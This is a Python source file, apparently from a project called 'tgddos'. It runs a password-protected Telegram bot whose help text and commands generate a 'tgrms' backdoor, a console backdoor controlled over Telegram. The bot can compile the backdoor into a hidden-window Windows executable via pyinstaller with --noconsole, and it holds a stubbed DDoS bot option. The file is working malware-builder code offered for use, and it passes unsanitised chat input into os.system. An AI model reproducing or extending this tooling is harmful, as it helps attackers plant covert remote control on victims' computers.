import sys
import os
import subprocess
import time
from config import *

#  **    ** **********   ******    *******   ****     **   *******    ********
# //**  ** /////**///   **////**  **/////** /**/**   /**  **/////**  **////// 
#  //****      /**     **    //  **     //**/**//**  /** **     //**/**       
#   //**       /**    /**       /**      /**/** //** /**/**      /**/*********
#    /**       /**    /**       /**      /**/**  //**/**/**      /**////////**
#    /**       /**    //**    **//**     ** /**   //****//**     **        /**
#    /**       /**     //******  //*******  /**    //*** //*******   ******** 
#    //        //       //////    ///////   //      ///   ///////   ////////  ...
#this file is part of project: tgddos

def setup():
    print('IMPORTANT: if you dont writed your telegram bot api key to config, stop script and write your key')
    time.sleep(2)
    print('IMPORTANT: if your system cant understand command pip go to the config')
    time.sleep(2)
    os.system(pip + ' install -r requirements.txt')
    global setup_
    setup_ = True

def save(option, toption):
    if option == 'read':
        result = open('save', 'r').read()
        result = result.split(' ')
        print(result[0])
        if result[0] == 'setup':
            setup()
        else:
            global password
            password = result[0]
            global setup_
            setup_ = False
    if option == 'write':
        open('save', 'w').write(toption)

save('read', None)
import telebot
bot = telebot.TeleBot(botkey)

@bot.message_handler(commands=['start'])
def start(message):
    global setup_
    if setup_:
        bot.send_message(message.from_user.id, 'HELLO! SETUP START! PLEASE SEND COMMAND - /reg [password]')

@bot.message_handler(commands=['reg'])
def reg(message):
    global setup_
    if setup_:
        mess = message.text.lower()
        mess = mess.split(' ')
        save('write', mess[1])
        global password
        password = mess[1]
        bot.send_message(message.from_user.id, 'YOUR PASSWORD = ' + mess[1])
        setup_ = False

@bot.message_handler(commands=['login'])
def login(message):
    global acsess
    global password
    if message.text.lower() == ('/login '+password):
        acsess = True
        bot.send_message(message.from_user.id, '+LOGIN')

@bot.message_handler(commands=['stop'])
def stop(message):
    global acsess
    if acsess:
        bot.stop_bot()

@bot.message_handler(commands=['help'])
def help(message):
    global acsess
    if acsess:
        bot.send_message(message.from_user.id, """
THIS IS HELP BANNER(BETA)
GENERATE BACKDOOR:
--------------------------

BETA

tgrms(console backdoor but telegram version(not server required)):
    /new_bot_app tgrms [token] [filename] [password for telegram bot] [convert to exe (y/n)]
                                                """)

@bot.message_handler(commands=['new_bot_app'])
def new_bot_app(message):
    global acsess
    if acsess:
        mess = message.text.lower()
        mess = mess.split(' ')
        if mess[1] == 'tgrms':
            bot.send_message(message.from_user.id, 'Starting...')
            gentgrms(mess[2], mess[4], mess[3])
            if mess[5] == 'y':
                os.system('pyinstaller ' + mess[3] + ' --onefile --noconsole')
            bot.send_message(message.from_user.id, 'ALL DONE!')
        if mess[1] == 'tgddos_bot':
            pass

bot.polling(none_stop=True)